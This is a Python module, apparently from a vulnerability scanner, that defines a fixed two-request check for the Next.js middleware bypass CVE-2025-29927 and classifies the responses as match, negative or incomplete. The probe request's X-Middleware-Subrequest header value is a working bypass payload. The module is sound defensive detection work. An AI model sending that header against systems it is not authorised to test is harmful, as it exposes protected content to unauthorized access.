"""First-party Apache-2.0 HTTP recipes executed by the existing ZAP adapter.

These fixed requests are not a general template language. No downloaded
Nuclei content, JavaScript flows, discovered destinations or caller code runs.
The selected case follows the vendor advisory, not a product/version banner.
"""

from __future__ import annotations

import hashlib
import json
from urllib.parse import urljoin, urlsplit

TEMPLATE_ID = "nextjs-middleware-bypass"
SUBREQUEST = ":".join(
    ["src/middleware"] * 5 + ["middleware"] * 5 + ["pages/_middleware"]
)
TEMPLATE = {
    "id": TEMPLATE_ID,
    "ruleId": "CVE-2025-29927",
    "origin": "https://github.com/MoonLadderStudios/MoonMind/blob/main/moonmind/security/known_issue_templates.py",
    "reference": "https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw",
    "license": "Apache-2.0",
    "author": "MoonMind",
    "impact": "Two anonymous GET requests; may read middleware-protected content.",
    "applicableTargets": "Explicit protected Next.js routes with a middleware login redirect.",
    "requests": [
        {"method": "GET", "headers": ["X-Nextjs-Data:1"]},
        {
            "method": "GET",
            "headers": ["X-Nextjs-Data:1", "X-Middleware-Subrequest:" + SUBREQUEST],
        },
    ],
    "matcher": "middleware-307-login-to-200/v3",
}


def provenance():
    payload = json.dumps(TEMPLATE, sort_keys=True, separators=(",", ":")).encode()
    return {**TEMPLATE, "sha256": hashlib.sha256(payload).hexdigest()}


def requests(origin: str, paths: list[str]) -> list[dict]:
    return [
        {"url": origin + path, "name": f"{TEMPLATE_ID}:{phase}", **request}
        for path in paths
        for phase, request in zip(("baseline", "probe"), TEMPLATE["requests"])
    ]


def observe(origin: str, path: str, entries: list[dict]) -> tuple[str, str, list[int]]:
    """Compare exact anonymous requests, never infer coverage from exit status."""

    response_fields = {
        "location",
        "x-nextjs-redirect",
        "x-nextjs-rewrite",
        "x-middleware-redirect",
        "x-middleware-rewrite",
    }

    def headers(message, *, response=False):
        rows = message.get("headers", [])
        if not isinstance(rows, list) or any(not isinstance(h, dict) for h in rows):
            return None
        values = {}
        for h in rows:
            name, value = h.get("name"), h.get("value")
            if not isinstance(name, str) or not isinstance(value, str):
                return None
            name = name.lower()
            # Repeated Set-Cookie/Vary fields are legitimate and do not
            # affect this matcher. Preserve ambiguity checks for its inputs.
            if response and name not in response_fields:
                continue
            if name in values:
                return None
            values[name] = value
        return values

    rows = [
        (i, row)
        for i, row in enumerate(entries)
        if (row.get("request") or {}).get("url") == origin + path
    ]
    if len(rows) != 2:
        return (
            "incomplete",
            "request_pair_unavailable_or_duplicated",
            [i for i, _ in rows],
        )
    responses = []
    for phase, (_, row) in enumerate(rows):
        req, res = row.get("request") or {}, row.get("response") or {}
        hs = headers(req)
        post = req.get("postData") or {}
        if (
            req.get("method") != "GET"
            or hs is None
            or any(h in hs for h in ("authorization", "cookie", "proxy-authorization"))
            or hs.get("x-nextjs-data") != "1"
            or hs.get("x-middleware-subrequest") != (SUBREQUEST if phase else None)
            or not isinstance(post, dict)
            or post.get("text")
        ):
            return "incomplete", "unexpected_request", [i for i, _ in rows]
        if (
            not isinstance(res.get("status"), int)
            or headers(res, response=True) is None
        ):
            return "incomplete", "malformed_response", [i for i, _ in rows]
        responses.append(res)
    baseline, probe = responses
    bh, ph = headers(baseline, response=True), headers(probe, response=True)
    redirect = next(
        (
            bh[k]
            for k in ("x-nextjs-redirect", "x-middleware-rewrite", "x-nextjs-rewrite")
            if k in bh
        ),
        "",
    )
    # The precondition is actual middleware enforcement, not an inferred
    # version. An already-public page cannot support either outcome.
    try:
        redirect_url = urlsplit(urljoin(origin + path, redirect))
    except ValueError:
        return "incomplete", "malformed_middleware_precondition", [i for i, _ in rows]
    if redirect_url.scheme + "://" + redirect_url.netloc != origin:
        return "incomplete", "off_origin_middleware_precondition", [i for i, _ in rows]
    if baseline["status"] != 307 or not any(
        word in redirect.lower()
        for word in ("login", "signin", "unauthorized", "forbidden")
    ):
        return (
            "incomplete",
            "middleware_precondition_not_observed",
            [i for i, _ in rows],
        )
    content = probe.get("content") or {}
    if not isinstance(content, dict) or content.get("encoding"):
        return "incomplete", "unsupported_response_content", [i for i, _ in rows]
    body = content.get("text")
    if (
        probe["status"] == 200
        and not any(
            name in ph
            for name in (
                "location",
                "x-nextjs-redirect",
                "x-nextjs-rewrite",
                "x-middleware-redirect",
                "x-middleware-rewrite",
            )
        )
        and isinstance(body, str)
        and body.strip()
        and not any(
            word in body.lower()
            for word in (
                "access denied",
                "request blocked",
                "request rejected",
                "support id",
            )
        )
    ):
        return "match", "middleware_redirect_changed_to_content", [i for i, _ in rows]
    if probe["status"] == 307 and all(
        ph.get(k) == v
        for k, v in bh.items()
        if k
        in ("x-nextjs-redirect", "x-middleware-rewrite", "x-nextjs-rewrite", "location")
    ):
        return "negative", "middleware_enforcement_preserved", [i for i, _ in rows]
    return "incomplete", "unexpected_probe_response", [i for i, _ in rows]
